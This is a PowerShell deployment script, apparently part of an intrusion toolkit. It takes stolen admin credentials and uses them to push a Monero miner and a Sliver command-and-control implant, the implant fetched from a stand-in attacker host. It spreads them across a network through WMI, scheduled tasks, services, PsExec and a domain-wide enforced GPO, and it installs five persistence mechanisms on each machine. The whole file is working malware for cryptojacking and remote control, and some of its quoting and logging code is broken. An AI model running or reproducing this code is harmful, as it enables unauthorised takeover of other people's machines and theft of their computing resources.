<# 
.SYNOPSIS
    Deploy.ps1 - Mass Miner + C2 Deployment + 5x Persistence
.DESCRIPTION
    Reads hits.txt, deploys miner + Sliver C2 + 5x persistence via GPO/PSEXEC/WMI/Task/Service
.NOTES
    Run as admin with Domain Admin creds for mass deploy.
#>

param(
    [string]$HitsFile = "C:\ProgramData\MF\Spray\hits.txt",
    [string]$AdminCredsFile = "C:\ProgramData\MF\Escalate\admin_creds.txt",
    [string]$OutputDir = "C:\ProgramData\MF\Deploy",
    [string]$MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip",
    [string]$Pool = "gulf.moneroocean.stream:10001",
    [string]$Wallet = "YOUR_WALLET",
    [string]$SliverUrl = "https://your-c2.com/sliver.exe"
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null

function Log { param([string]$msg) $ts = Get-Date -Format "HH:mm:ss"; Write-Host "[$ts] $msg" }

Log "=== DEPLOY STARTED ==="

# Build deployment command
$minerCmd = "powershell -c `\"iwr '$MinerUrl' -o `\$env:TEMP\xmrig.zip; Expand-Archive `\$env:TEMP\xmrig.zip` `\$env:TEMP\xmrig` -Force; \$exe = gci `\$env:TEMP\xmrig` -r -filter xmrig.exe | select -first 1; & \$exe.FullName -o $Pool -u $Wallet -p `\$env:COMPUTERNAME -k --donate-level 1`\""
$sliverCmd = "powershell -c `\"iwr $SliverUrl -o `\$env:TEMP\sliver.exe; & `\$env:TEMP\sliver.exe` implant --name \$env:COMPUTERNAME --mtls your-c2.com:443`\""
$fullCmd = "$minerCmd; $sliverCmd"

# 5x Persistence Command
$persistCmd = @"
\$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{Name='MF_Persist';EventNamespace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=0 AND TargetInstance.Minute=0"}
\$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{Name='MF_Consumer';CommandLineTemplate='$fullCmd'}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=\$filter;Consumer=\$consumer}
schtasks /create /tn "MF_Persist" /tr "cmd /c $fullCmd" /sc onstart /ru System /f
sc.exe create MF_Persist binPath= "cmd /c $fullCmd" start= auto
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v MF_Persist /t REG_SZ /d "cmd /c $fullCmd" /f
$startup = [Environment]::GetFolderPath("Startup"); $lnk = (New-Object -ComObject WScript.Shell).CreateShortcut("$startup\MF.lnk"); $lnk.TargetPath = "powershell.exe"; $lnk.Arguments = "-c `$fullCmd"; $lnk.Save()
"@

$fullDeployCmd = "$fullCmd; $persistCmd"

Log "=== DEPLOY STARTED ==="

# Function to deploy to single target
function Deploy-Target {
    param($ip, $user, $pass, $proto)
    
    $sec = ConvertTo-SecureString $pass -AsPlainText -Force
    $cred = New-Object PSCredential $user, $sec
    $success = $false
    
    # 1. WMI
    try { 
        Invoke-WmiMethod -ComputerName $ip -Credential $cred -Class Win32_Process -Name Create -Arguments "cmd /c $fullDeployCmd" -ErrorAction Stop
        Log "WMI OK: $ip" -ForegroundColor Green
        return $true 
    } catch {}
    
    # 2. Scheduled Task
    try { 
        $tn = "MF_Upd"+(Get-Random -Max 9999)
        cmd /c "schtasks /create /s $ip /u $user /p $pass /tn $tn /tr `\"cmd /c $fullDeployCmd`\" /sc once /st 00:00 /ru System /f" 2>&1 | Out-Null
        cmd /c "schtasks /run /s $ip /tn $tn /u $user /p $pass" 2>&1 | Out-Null
        Start-Sleep 2
        cmd /c "schtasks /delete /s $ip /tn $tn /f" 2>&1 | Out-Null
        Log "Task OK: $ip" -ForegroundColor Green
        return $true
    } catch {}
    
    # 3. Service
    try { 
        $sn = "MF"+(Get-Random -Max 9999)
        cmd /c "sc.exe \\$ip create $sn binPath= `\"cmd /c $fullDeployCmd`\" start= auto" 2>&1 | Out-Null
        cmd /c "sc.exe \\$ip start $sn" 2>&1 | Out-Null
        Log "Service OK: $ip" -ForegroundColor Green
        return $true
    } catch {}
    
    # 4. PSEXEC
    try {
        & psexec.exe \\$ip -u $user -p $pass -h -d cmd /c $fullDeployCmd 2>&1 | Out-Null
        Log "PSEXEC OK: $ip" -ForegroundColor Green
        return $true
    } catch {}
    
    return $false
}

# Load admin creds (from escalate phase)
$adminCreds = @()
if (Test-Path $AdminCredsFile) {
    $adminCreds = Get-Content $AdminCredsFile
} elseif (Test-Path $HitsFile) {
    $adminCreds = Get-Content $HitsFile
}

Log "Admin creds loaded: $($adminCreds.Count)"

# Also try Domain Admin mass deploy via GPO
function Deploy-GPO {
    Log "Attempting GPO mass deploy..."
    try {
        $gpoName = "MF_Miner_Deploy_$(Get-Random -Max 9999)"
        $gpo = New-GPO -Name $gpoName -Comment "MF Miner Deployment"
        $gpo | Set-GPRegistryValue -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "MF_Miner" -Type String -Value "cmd /c $fullDeployCmd"
        $gpo | Set-GPRegistryValue -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" -ValueName "MF_Miner" -Type String -Value "cmd /c $fullDeployCmd"
        $gpo | Set-GPInheritance -Target "OU=Domain Controllers,$(Get-ADDomain | Select -ExpandProperty DistinguishedName)" -IsBlocked $false
        Log "GPO created: $gpoName - linking to domain..."
        New-GPLink -Name $gpoName -Target "dc=$(($env:USERDNSDOMAIN -split '\.') -join ',dc=')" -Enforced Yes -LinkEnabled Yes
        Log "GPO linked to domain - will deploy to all domain-joined machines"
        return $true
    } catch { 
        Log "GPO deploy failed: $_" 
        return $false
    }
}

# Main deployment logic
$deployed = 0
$total = $adminCreds.Count

if ($total -eq 0) {
    Log "No admin creds found. Trying hits.txt..."
    if (Test-Path "C:\ProgramData\MF\Spray\hits.txt") {
        $adminCreds = Get-Content "C:\ProgramData\MF\Spray\hits.txt"
    }
}

if ($adminCreds.Count -eq 0) {
    Log "ERROR: No credentials available for deployment"
    exit 1
}

Log "Starting deployment to $($adminCreds.Count) targets..."

# Try GPO first (mass deploy if DA)
$gpoSuccess = Deploy-GPO
if ($gpoSuccess) {
    Log "GPO MASS DEPLOY INITIATED - will hit all domain-joined machines" -ForegroundColor Green
    $deployed += 999999  # symbolic
}

# Parallel deploy to individual targets
$jobs = @()
foreach ($line in $adminCreds) {
    $ip,$user,$pass,$proto = $line.Split("|")
    if (-not $ip -or -not $user -or -not $pass) { continue }
    
    $job = Start-Job -ScriptBlock {
        param($ip, $user, $pass, $fullDeployCmd)
        $sec = ConvertTo-SecureString $pass -AsPlainText -Force
        $cred = New-Object PSCredential $user, $sec
        
        $success = $false
        try { Invoke-WmiMethod -ComputerName $ip -Credential $cred -Class Win32_Process -Name Create -Arguments "cmd /c $fullDeployCmd" -ErrorAction Stop; $success=$true } catch {}
        if (-not $success) { try { $tn="MF_Upd"+(Get-Random); cmd /c "schtasks /create /s $ip /u $user /p $pass /tn $tn /tr `\"cmd /c $fullDeployCmd`\" /sc once /st 00:00 /ru System /f" 2>&1 | Out-Null; cmd /c "schtasks /run /s $ip /tn $tn /u $user /p $pass" 2>&1 | Out-Null; Start-Sleep 2; cmd /c "schtasks /delete /s $ip /tn $tn /f" 2>&1 | Out-Null; $success=$true } catch {} }
        if (-not $success) { try { $sn="MF"+(Get-Random); cmd /c "sc.exe \\$ip create $sn binPath= `\"cmd /c $fullDeployCmd`\" start= auto" 2>&1 | Out-Null; cmd /c "sc.exe \\$ip start $sn" 2>&1 | Out-Null; $success=$true } catch {} }
        
        return @{IP=$ip; Success=$success}
    } -ArgumentList $ip, $user, $pass, $fullDeployCmd
    
    $jobs += $job
    # Throttle concurrent jobs
    while ($jobs.Count -ge 20) { $done = $jobs | Where-Object { $_.State -in @('Completed','Failed') }; if ($done) { $done | Remove-Job }; Start-Sleep -Milliseconds 500 }
}

Log "Waiting for deployment jobs to complete..."
$jobs | Wait-Job | Out-Null
foreach ($job in $jobs) {
    $result = $job | Receive-Job
    if ($result.Success) { $deployed++; Log "DEPLOYED: $($result.IP)" -ForegroundColor Green }
    $job | Remove-Job
}

Log "=== DEPLOY COMPLETE ==="
Log "Total deployed: $deployed"
Log "Hashrate estimate: $($deployed * 1000) H/s"
Log "Output: $OutputDir\deploy_log.txt"

# Save deployment log
"$deployed miners deployed at $(Get-Date)" | Out-File "$OutputDir\deploy_log.txt" -Append -Encoding UTF8